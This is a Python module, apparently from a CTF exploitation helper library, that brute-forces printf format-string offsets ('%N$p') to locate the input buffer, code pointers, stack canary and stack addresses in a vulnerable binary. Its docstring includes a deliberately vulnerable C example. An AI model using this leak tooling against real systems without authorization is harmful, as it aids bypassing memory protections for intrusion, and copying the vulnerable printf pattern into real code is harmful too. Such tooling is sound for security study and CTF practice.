'''Offset bruteforcers for format string bugs
----------------------------------------------
note: 'offset' refers to the `n` in
    %n$m
when dealing with printf exploitation.
----------------------------------------------
To use any of the functions here, you should
predefine a function that fsb.find_offset can
interact with. If a binary has code like:

    int main(){
        char s[200];
        fgets(s, 199, stdin);
        printf(s);
    }

fsb.find_offset needs a function that can
abstract away the i/o of the binary:

    def printf_io(send: str) -> bytes:
        r = remote(...)
        r.send(send)
        return r.recvline()

Then, we can use the io function to find, e.g.
the offset of the stack canary:

>>> fsb.find_offset.canary(printf_io)
31
'''
from pwnscripts.string_checks import context, extract_first_hex, log, findall, is_canary
import pwnscripts.config as config
from functools import wraps

def _sendprintf(requirement):
    @wraps(requirement)
    def inner(sendprintf) -> int:
        preserved_log_level = context.log_level
        for i in range(config.PRINTF_MIN,config.PRINTF_MAX): #note that we're not handling unaligned printf
            context.log_level = 'WARN'  # Patchwork to suppress annoying spam. Not the best solution.
            v = extract_first_hex(sendprintf('A'*8 + '%{}$p\n'.format(i)))
            context.log_level = preserved_log_level
            if context.log_level == 'DEBUG':
                print('pwnscripts: v is %d' % v)
            if v == -1: continue
            if requirement(v):
                log.info('offset for %r: %d' % (requirement.__name__, i))
                return i
        raise RuntimeError
    return inner

@_sendprintf
def buffer(resp) -> int:
    '''Bruteforcer to locate the offset of the input string itself.
    i.e. if buffer() returns 6,
        printf("%6$d") gives the value of p32("%6$p")
    '''
    expected = (0x41414141 if context.arch == 'i386' else 0x4141414141414141)
    return expected == resp

@_sendprintf
def code(resp) -> int:
    return findall({'i386': '0x804...', 'amd64': '0x40....'}[context.arch], hex(resp)) != []

@_sendprintf
def canary(resp) -> int:
    '''heuristic-based bruteforcer to find the offset of a stack canary.
    
    In particular, a word matching
        word[-1]=='\\0' AND word.count('\\0')==1
        AND NOT looks_like_address()
    will be assumed a canary.
    '''
    return is_canary(resp)

@_sendprintf
def stack(resp) -> int:
    if context.arch != 'amd64': raise NotImplementedError
    return findall('0x7ff.........', hex(resp)) != []
